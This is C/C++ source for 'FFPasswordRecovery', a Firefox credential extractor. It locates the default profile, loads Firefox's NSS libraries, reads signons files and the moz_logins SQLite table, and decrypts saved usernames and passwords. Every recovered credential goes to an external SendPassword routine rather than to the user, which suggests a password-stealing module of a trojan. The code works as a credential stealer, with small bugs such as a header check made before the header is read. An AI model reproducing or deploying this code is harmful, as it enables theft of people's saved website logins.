/*
 * Tool name   : FFPasswordRecovery
 * Description : A tool recover Firefox autocomplete and authentication 
 *               account data.
 * Author      : Ruben Unteregger
 * Webpage     : http://www.megapanzer.com
 * Version     : 0.2
 * OS          : Tested on Microsoft Windows XP
 * Todo        : -
 *
 * Changes     : 2010 01 28 : Added SQLite support for FF >= 3.5 
 * Code clean up by -
 */

#include "stdio.h"
#include "windows.h"
#include "Shlwapi.h"
#include "sqlite3.h"
#include "Config.h"
#include "Functions.h"

#define MAX_BUF_SIZE 1024
#define snprintf _snprintf

#define NSS_LIBRARY_NAME        "nss3.dll"
#define PLC_LIBRARY_NAME        "plc4.dll"
#define NSPR_LIBRARY_NAME       "nspr4.dll"
#define PLDS_LIBRARY_NAME       "plds4.dll"
#define SOFTN_LIBRARY_NAME      "softokn3.dll"
#define SQLITE_LIBRARY_NAME     "sqlite3.dll"

#define FIREFOX_PATH           "Mozilla\\Firefox\\"
#define FIREFOX_REG_PATH       "SOFTWARE\\Clients\\StartMenuInternet\\firefox.exe\\shell\\open\\command"
#define FIREFOX_PROFILES_FILE  "profiles.ini"

#define HEADER_VERSION1    "#2c"
#define HEADER_VERSION2    "#2d"
#define HEADER_VERSION3    "#2e"
#define CRYPT_PREFIX       "~"


// Constants, data types and function forward declarations.

// Internal structure declaration taken from firefox.....
typedef enum SECItemType
{
  siBuffer = 0,
  siClearDataBuffer = 1,
  siCipherDataBuffer = 2,
  siDERCertBuffer = 3,
  siEncodedCertBuffer = 4,
  siDERNameBuffer = 5,
  siEncodedNameBuffer = 6,
  siAsciiNameString = 7,
  siAsciiString = 8,
  siDEROID = 9,
  siUnsignedInteger = 10,
  siUTCTime = 11,
  siGeneralizedTime = 12
};


struct SECItem 
{
  SECItemType type;
  unsigned char *data;
  unsigned int len;
};

typedef enum SECStatus 
{
  SECWouldBlock = -2,
  SECFailure = -1,
  SECSuccess = 0
};


typedef struct 
{
  int *sBufLength;
  char *sDataBuf;
} FF_ACCDATA;

typedef struct PK11SlotInfoStr PK11SlotInfo;


// NSS Library functions
typedef SECStatus (*NSS_Init) (const char *configdir);
typedef SECStatus (*NSS_Shutdown) (void);
typedef PK11SlotInfo *(*PK11_GetInternalKeySlot) (void);
typedef void (*PK11_FreeSlot) (PK11SlotInfo *slot);
typedef SECStatus (*PK11_CheckUserPassword) (PK11SlotInfo *slot,char *pw);
typedef SECStatus (*PK11_Authenticate) (PK11SlotInfo *slot, int loadCerts, void *wincx);
typedef SECStatus (*PK11SDR_Decrypt) (SECItem *data, SECItem *result, void *cx);

// PLC Library functions
typedef char *(*PL_Base64Decode)(const char *src, unsigned int srclen, char *dest);

// Sqlite Functions
typedef SQLITE_API int (* Sqlite_Func_Open) (
  const char *filename,   /* Database filename (UTF-8) */
  sqlite3 **ppDb          /* OUT: SQLite db handle */
);
typedef SQLITE_API int (* Sqlite_Func_Exec) (
  sqlite3*,                                  /* An open database */
  const char *sql,                           /* SQL to be evaluated */
  int (*callback)(void*,int,char**,char**),  /* Callback function */
  void *,                                    /* 1st argument to callback */
  char **errmsg                              /* Error msg written here */
);
typedef SQLITE_API void (* Sqlite_Func_Free) (void*);
typedef SQLITE_API int (* Sqlite_Func_Close) (sqlite3 *);

void lowerCase(char *pBuffer);
int getCurrentUserProfilePath(char * AppData, char * lProfileDir);
int initializeFirefoxLibrary(char *pFFPath);
HMODULE loadLib(char *pFFDir, char *pLibraryName);
void terminateFirefoxLibrary(void);
int initializeNSSLibrary(char *pProfilePath, char *pPassword);
void dumpSignonSecrets(char * lProfileDir, char * lFFDir);
int checkMasterPassword(char * pPassword); 

int decryptSecretString(char *pCryptData, char **pClearData);
char *base64Decode(char *pCryptData, int *pDecodeLen);
int PK11Decrypt(char *decodeData, int decodeLen, char **clearData, int *pDecodedDataLength);
static int callbackFFAccounts(void *pFFAccData, int argc, char **argv, char **azColName);


NSS_Init NSSInit = NULL;
NSS_Shutdown NSSShutdown = NULL;
PK11_GetInternalKeySlot PK11GetInternalKeySlot = NULL;
PK11_CheckUserPassword PK11CheckUserPassword = NULL;
PK11_FreeSlot PK11FreeSlot = NULL;
PK11_Authenticate PK11Authenticate = NULL;
PK11SDR_Decrypt PK11SDRDecrypt = NULL;
PL_Base64Decode PLBase64Decode = NULL;

Sqlite_Func_Open asqlite3_open = NULL;
Sqlite_Func_Exec asqlite3_exec = NULL;
Sqlite_Func_Free asqlite3_free = NULL;
Sqlite_Func_Close asqlite3_close = NULL;

char gMasterPassword[MAX_BUF_SIZE + 1];

HMODULE gLibNSS = NULL;
HMODULE gLibPLC = NULL;
HMODULE libtmp = NULL;
HMODULE gLibNSPR = NULL;
HMODULE gLibPLDS = NULL;
HMODULE gLibSOFTN = NULL;
HMODULE FireFoxLibrarySqlite3 = NULL;


void lowerCase(char *pBuffer)
{
    int lStringLength = strlen(pBuffer);

    for (int lCounter = 0; lCounter < lStringLength; lCounter++)
        if( pBuffer[lCounter] >= 65 && pBuffer[lCounter] <= 90)
            pBuffer[lCounter] += 32;
}


// main function =)

void initFirefoxRecovery(char * AppData)
{
    char lProfileDir[MAX_PATH];
    char lFFDir[MAX_PATH];

    if (!getCurrentUserProfilePath(AppData, lProfileDir) || !GetPathFromRegistryEntry(lFFDir, HKEY_LOCAL_MACHINE, FIREFOX_REG_PATH) || !initializeFirefoxLibrary(lFFDir) || !initializeNSSLibrary(lProfileDir, NULL))
        return;

    dumpSignonSecrets(lProfileDir, lFFDir);
    terminateFirefoxLibrary();
}


// Determine the firefox profile directory

int getCurrentUserProfilePath(char * AppData, char * lProfileDir)
{
    char lProfileFileName[MAX_BUF_SIZE + 1];
    char lFileLine[MAX_BUF_SIZE + 1];
    int  lDefaultFound = 0;
    DWORD lBytesRead = 0;
    char *lDataBuffer = NULL;
    int lLastPosition = 0;
    char *lSlashAt = NULL;
    char *start = NULL;
    FILE *lFH = NULL;

    strncpy(lProfileFileName, AppData, sizeof(lProfileFileName) - 1);
    strcat(lProfileFileName, "\\" FIREFOX_PATH FIREFOX_PROFILES_FILE);

    // Get firefox profile directory
    if ((lFH = fopen(lProfileFileName, "r")) == NULL)
        return false;

    memset(lFileLine, 0, sizeof(lFileLine));
    while(fgets(lFileLine, sizeof(lFileLine) - 1, lFH)!= NULL)
    {
        lowerCase(lFileLine);

        if (!lDefaultFound && ( strstr(lFileLine, "name=default") != NULL))
        {
            lDefaultFound = 1;
            continue;
        }

        // We have got default profile. Check for its path value.
        if(lDefaultFound)
        {
            if (strstr(lFileLine, "path=") != NULL)
            {
                if ((lSlashAt = strstr(lFileLine,"/")) != NULL)
                    *lSlashAt = '\\';
	
                lFileLine[strlen(lFileLine)-1] = 0;
                start = strstr(lFileLine, "=");
                strncpy(lProfileDir, AppData, MAX_PATH);
                strcat(lProfileDir, "\\" FIREFOX_PATH);
                strcat(lProfileDir, start+1);
                fclose(lFH);
                return true;
            }
        }
        memset(lFileLine, 0, sizeof(lFileLine));
    }

    fclose(lFH);
    return false;
}


// Load a DLL within a specific directory.

HMODULE loadLib(char *pFFDir, char *pLibraryName)
{
    char lCWD[MAX_BUF_SIZE + 1];
    HMODULE lRetVal = 0;

    memset(lCWD, 0, sizeof(lCWD));
    GetCurrentDirectoryA(sizeof(lCWD) - 1, lCWD);
    SetCurrentDirectoryA(pFFDir);

    lRetVal = LoadLibraryA(pLibraryName);
    SetCurrentDirectoryA(lCWD);

    return(lRetVal);
}


// Load all required DLLs and functions.

int initializeFirefoxLibrary(char *pFFPath)
{

    if (!(gLibNSPR = loadLib(pFFPath, NSPR_LIBRARY_NAME)))
        if (!(gLibNSPR = LoadLibraryA(NSS_LIBRARY_NAME)))
            return 1;

    if (!(gLibPLC = loadLib(pFFPath, PLC_LIBRARY_NAME)))
        if ((gLibPLC = LoadLibraryA(PLC_LIBRARY_NAME)) == NULL)
            return 1;

    if (!(gLibPLDS = loadLib(pFFPath, PLDS_LIBRARY_NAME)))
        if ((gLibPLDS = LoadLibraryA(PLDS_LIBRARY_NAME)) == NULL)
            return 1;

    if (!(gLibSOFTN = loadLib(pFFPath, SOFTN_LIBRARY_NAME)))
        if ((gLibSOFTN = LoadLibraryA(SOFTN_LIBRARY_NAME)) == NULL)
            return 1;

    if (!(gLibNSS = loadLib(pFFPath, NSS_LIBRARY_NAME)))
        if ((gLibNSS = LoadLibraryA(NSS_LIBRARY_NAME)) == NULL)
            return 1;


    // load sqlite functions
    if (FireFoxLibrarySqlite3 = loadLib(pFFPath, SQLITE_LIBRARY_NAME))
    {
	    if (!(asqlite3_open = (Sqlite_Func_Open) GetProcAddress(FireFoxLibrarySqlite3, "sqlite3_open")) ||
            !(asqlite3_exec = (Sqlite_Func_Exec) GetProcAddress(FireFoxLibrarySqlite3, "sqlite3_exec")) ||
            !(asqlite3_free = (Sqlite_Func_Free) GetProcAddress(FireFoxLibrarySqlite3, "sqlite3_free")) ||
            !(asqlite3_close = (Sqlite_Func_Close) GetProcAddress(FireFoxLibrarySqlite3, "sqlite3_close")) )
            return 0;
    }
    

    // Load all the function addresses.
	if (!(NSSInit = (NSS_Init) GetProcAddress(gLibNSS, "NSS_Init")) ||
        !(NSSShutdown = (NSS_Shutdown)GetProcAddress(gLibNSS, "NSS_Shutdown")) ||
        !(PK11GetInternalKeySlot = (PK11_GetInternalKeySlot) GetProcAddress(gLibNSS, "PK11_GetInternalKeySlot")) ||
        !(PK11FreeSlot = (PK11_FreeSlot) GetProcAddress(gLibNSS, "PK11_FreeSlot")) ||
        !(PK11Authenticate = (PK11_Authenticate) GetProcAddress(gLibNSS, "PK11_Authenticate")) ||
        !(PK11SDRDecrypt = (PK11SDR_Decrypt) GetProcAddress(gLibNSS, "PK11SDR_Decrypt")) ||
        !(PK11CheckUserPassword = (PK11_CheckUserPassword ) GetProcAddress(gLibNSS, "PK11_CheckUserPassword")) ||
        !(PLBase64Decode = (PL_Base64Decode) GetProcAddress(gLibPLC, "PL_Base64Decode")) )
        return 0;

    return 1;
}


// Initialize the NSS library, provide here a master password

int initializeNSSLibrary(char *pProfilePath, char *pPassword)
{
    if( (*NSSInit) (pProfilePath) != SECSuccess)
    {
        terminateFirefoxLibrary();
        return 0;
    }

    // Setup and check if master password is correct
    if( (pPassword == NULL) || strlen(pPassword) <= 0)
        gMasterPassword[0] = 0;
    else
        strcpy(gMasterPassword, pPassword);
	
    if(checkMasterPassword(gMasterPassword) != 0)
    {
        terminateFirefoxLibrary();
        return 0;
    }

    return 1;
}


// Terminates and unloads NSS library.

void terminateFirefoxLibrary(void)
{
    if(NSSShutdown != NULL)
        (*NSSShutdown)();

    if(gLibNSS != NULL)
        FreeLibrary(gLibNSS);

    if(gLibPLC != NULL)
        FreeLibrary(gLibPLC);
}


/*
 * This function reads the firefox signons files and dumps the 
 *  host/username/password information in clear text.
 */

void dumpSignonSecrets(char * lProfileDir, char * lFFDir)
{
    char lTemp[10240];
    char lURL[10240];

    char *lClearText = NULL;
    char lSignonFilePath[MAX_PATH];
    char *lSignonFileNameSQLite = "\\signons.sqlite";
    char lSignonFiles[4][128] = {"\\signons.txt", "\\signons2.txt", "\\signons3.txt", NULL};
    FILE *lFH = NULL;
    sqlite3 *lDB = NULL;
    char *lErrMsg = 0;
    FF_ACCDATA lFFAccData;

    int lIterationCounter = 0;
    int lTempSize = sizeof(lTemp);
    int lFFVersion = 1;
    int lCounter = 0;

    char lResourceName[MAX_BUF_SIZE + 1];
    char lResourceType[MAX_BUF_SIZE + 1];
    char lUsername[MAX_BUF_SIZE + 1];
    char lPassword[MAX_BUF_SIZE + 1];


    memset(&lFFAccData, 0, sizeof(lFFAccData));

    // Open the signon file/database 
    lCounter = 0;
    while (lCounter < 3)
    {
        memset(lSignonFilePath, 0, sizeof(lSignonFilePath));
        strcpy(lSignonFilePath, lProfileDir);
        strcat(lSignonFilePath, lSignonFiles[lCounter]);

        lFFVersion = lCounter + 1;


        if ((lFH = fopen(lSignonFilePath, "r")) != NULL)
        {
            // check if the format is right...
            if (((lFFVersion == 1) && strcmp(lTemp, HEADER_VERSION1) != 0) ||
                ((lFFVersion == 2) && strcmp(lTemp, HEADER_VERSION2) != 0) ||
                ((lFFVersion == 3) && strcmp(lTemp, HEADER_VERSION3) != 0) )
              goto END;

            // Read the Firefox header format information and check if the version information extracted from the signon file is supported by the tool
            memset(lTemp, 0, sizeof(lTemp));
            if (fgets(lTemp, sizeof(lTemp) - 1, lFH) == 0)
                goto END;

            StrTrimA(lTemp, "\t\r\n");

            // Read the reject list.
            while (fgets(lTemp, sizeof(lTemp) - 1, lFH))
            {
                // Check for end of reject list
                if (strlen(lTemp) != 0 && lTemp[0] == '.') 
                    break; 
            }

            // Read the URL line 
            while (fgets(lTemp, sizeof(lTemp) - 1, lFH))
            {
                // Arrange leading and trailing characters (CR and NL).
                if (lTemp[strlen(lTemp) - 1] == '\n' || lTemp[strlen(lTemp) - 1] == '\r')
                    lTemp[strlen(lTemp) - 1] = 0;

                lIterationCounter = 0;

                memset(lResourceName, 0, sizeof(lResourceName));
                memset(lResourceType , 0, sizeof(lResourceType));
                memset(lUsername , 0, sizeof(lUsername));
                memset(lPassword , 0, sizeof(lPassword));

                strncpy(lResourceName, lTemp, sizeof(lResourceName) - 1);
        
                // Read the name/value pairs.
                while (fgets(lTemp, sizeof(lTemp) - 1, lFH))
                {
                    // Arrange leading and trailing characters (CR and NL).
                    while (lTemp[strlen(lTemp) - 1] == '\n' || lTemp[strlen(lTemp) - 1] == '\r')
                        lTemp[strlen(lTemp) - 1] = 0;

                    // Line starting with . terminates the pairs for this URL entry.
                    if (lTemp[0] == '.') 
                        break; 

                    // If a valid record was found (we recognize a valid record if it starts with an '*') we save the URL and read username and password.
                    if (lTemp[0] == '*') 
                    {
                        strcpy(lURL, &lTemp[1]);
                        if (fgets(lTemp, sizeof(lTemp) - 1, lFH) == 0)
                            break;
                    }
                    else
                    {
                        strcpy(lURL, lTemp);
                        if (fgets(lTemp, sizeof(lTemp) - 1, lFH) == NULL)
                            break;
                    }

                    while (lTemp[strlen(lTemp) - 1] == '\n' || lTemp[strlen(lTemp) - 1] == '\r')
                        lTemp[strlen(lTemp) - 1] = 0;

                    // Decrypt the data buffer.
                    if(decryptSecretString(lTemp, &lClearText) == 0)
                    {
                        if (lIterationCounter == 0)
                            strncpy(lUsername, lClearText, sizeof(lUsername) - 1);
                        else 
                            strncpy(lPassword, lClearText, sizeof(lPassword) - 1);

                        lIterationCounter++;
                        lClearText = NULL;
                    }
                }

                SendPassword(Password_Firefox, lURL, lUsername, lPassword);
            }

            fclose(lFH);
        }
        lCounter++;
    }


    // Firefox 3.* with SQLite
    strncpy(lSignonFilePath, lProfileDir, MAX_PATH);
    strcat(lSignonFilePath, lSignonFileNameSQLite);

/*  old code: statically link to sqlite library (+ ~200 KB code)

    if(sqlite3_open(lSignonFilePath, &lDB) != SQLITE_OK)
        goto END;

    if(sqlite3_exec(lDB, "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins", callbackFFAccounts, &lFFAccData, &lErrMsg))
    sqlite3_free(lErrMsg);

    sqlite3_close(lDB);
    */

    // use the Sqlite3.dll from the FireFox installation
    if (FireFoxLibrarySqlite3)
    {
        // TODO: CHECK IF ITS IN USE !!!
        if(asqlite3_open(lSignonFilePath, &lDB) != SQLITE_OK)
            goto END;

        if(asqlite3_exec(lDB, "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins", callbackFFAccounts, &lFFAccData, &lErrMsg))
        asqlite3_free(lErrMsg);

        asqlite3_close(lDB);
    }

END:

    if (lFH != NULL)
        fclose(lFH);

    if (lClearText != NULL)
        free(lClearText);
}


// Verifies if the specified master password is correct. (0 = success, 1 = failure)

int checkMasterPassword(char *pPassword)
{
    PK11SlotInfo *lSlot = 0;
    int lRetVal = 0;

    if (! (lSlot = (*PK11GetInternalKeySlot)())) 
        return 1;

    // First check if the master password set
    if(pPassword[0] != 0)
    {
        if((*PK11CheckUserPassword)(lSlot, "") == SECSuccess)
        {
            (*PK11FreeSlot)(lSlot);
            return 1;
        }
    }

    if( (*PK11CheckUserPassword)(lSlot, pPassword) == SECSuccess )
        lRetVal = 0;
    else	
        lRetVal = 3;

    (*PK11FreeSlot) (lSlot);
    return(lRetVal);
}


int decryptSecretString(char *pCryptData, char **pClearData)
{
    int lRetVal = 0;
    int lDecodedDataLength = 0;
    char *lDecodedData = NULL;
    int lDecryptedDataLength = 0;
    char *lDecryptedData = NULL;
    unsigned int PREFIX_Len = 0;

    // Treat zero-length crypt string as a special case.
    if(pCryptData[0] == '\0') 
    {
        *pClearData = NULL;
        return 1;
    }

    // Use decryption routine...if crypt does not start with prefix...( for Firefox ) otherwise use base64 decoding ( for mozilla default installation) For firefox its always encrypted with 3DES.
    if(pCryptData[0] != CRYPT_PREFIX[0]) 
    {
        // First do base64 decoding.....
        if((lDecodedData = base64Decode(pCryptData, &lDecodedDataLength)) == NULL || lDecodedDataLength <= 0)
            return 1;

        // Now do actual PK11 decryption.
        if((PK11Decrypt(lDecodedData, lDecodedDataLength, &lDecryptedData, &lDecryptedDataLength) > 0) || (lDecryptedData == NULL))
            return 1;

        *pClearData = new char[lDecryptedDataLength + 1];
        (*pClearData)[lDecryptedDataLength] = '\0';
	    memcpy(*pClearData, lDecryptedData, lDecryptedDataLength);
    }
    else
    {
        // Just do base64 decoding.
        PREFIX_Len = (int) strlen(CRYPT_PREFIX);
        if(strlen(pCryptData) == PREFIX_Len)
        {
            *pClearData = NULL;
            return 1;
        }

        if((*pClearData = base64Decode(&pCryptData[PREFIX_Len], &lDecodedDataLength)) == NULL)
            return 1;
    }

    return 0;
}


// Decrypt passed data buffer.

int PK11Decrypt(char *pEncodedData, int pEncodedDataLength, char **pDecodedData, int *pDecodedDataLength)
{
    PK11SlotInfo *lSlot = NULL;
    SECItem lRequest;
    SECItem lReply;

    // Find token with SDR key.
    if (! (lSlot = (*PK11GetInternalKeySlot)()))
        return 1;
	
    if ((*PK11Authenticate)(lSlot, 1, NULL) != SECSuccess)
    {
        (*PK11FreeSlot)(lSlot);
        return 1;
    }

    // Decrypt the string.
    lRequest.data = (unsigned char *) pEncodedData;
    lRequest.len = pEncodedDataLength;
    lReply.data = 0;
    lReply.len = 0;

    if ((*PK11SDRDecrypt)(&lRequest, &lReply, NULL) != SECSuccess) 
    {
        (*PK11FreeSlot)(lSlot);
        return 1;
    }

    // WARNING : This string is not NULL terminated..
    *pDecodedData = (char*)lReply.data;
    *pDecodedDataLength  = lReply.len;

    (*PK11FreeSlot)(lSlot);

    return 0;
}


// Decode a Base64 encoded data buffer.

char *base64Decode(char *pCryptData, int *pDecodeLen)
{
    int lCryptDataSize = (int) strlen(pCryptData);
    int lAdjust = 0;
    char *lRetVal = NULL;

    // Compute length adjustment.
    if (pCryptData[lCryptDataSize - 1] == '=') 
    {
        lAdjust++;
        if (pCryptData[lCryptDataSize - 2] == '=') 
            lAdjust++;
    }

    if((lRetVal = (char *)(*PLBase64Decode)(pCryptData, lCryptDataSize, NULL)) != NULL)
        *pDecodeLen = (lCryptDataSize * 3) / 4 - lAdjust;

	return(lRetVal);
}


// passing all the data

static int callbackFFAccounts(void *pFFAccData, int argc, char **argv, char **azColName)
{
    int lErrorNo = 0;
    char lUsername[MAX_BUF_SIZE + 1];
    char *lClearText = NULL;
    char lPassword[MAX_BUF_SIZE + 1];
    FF_ACCDATA *lFFAccData = (FF_ACCDATA *) pFFAccData;

    for(int lCounter = 0; lCounter < argc; lCounter += 8)
    {
        if (argv[lCounter])
        {
            // Decrypt username and password
            lClearText = NULL;
            if((lErrorNo = decryptSecretString(argv[lCounter+1], &lClearText)) == 0)
                strncpy(lUsername, lClearText, sizeof(lUsername) - 1);

            lClearText = NULL;
            if((lErrorNo = decryptSecretString(argv[lCounter+2], &lClearText)) == 0)
                strncpy(lPassword, lClearText, sizeof(lPassword) - 1);

            SendPassword(Password_Firefox, argv[lCounter], lUsername, lPassword);
        }
    }

  return(0);  
}
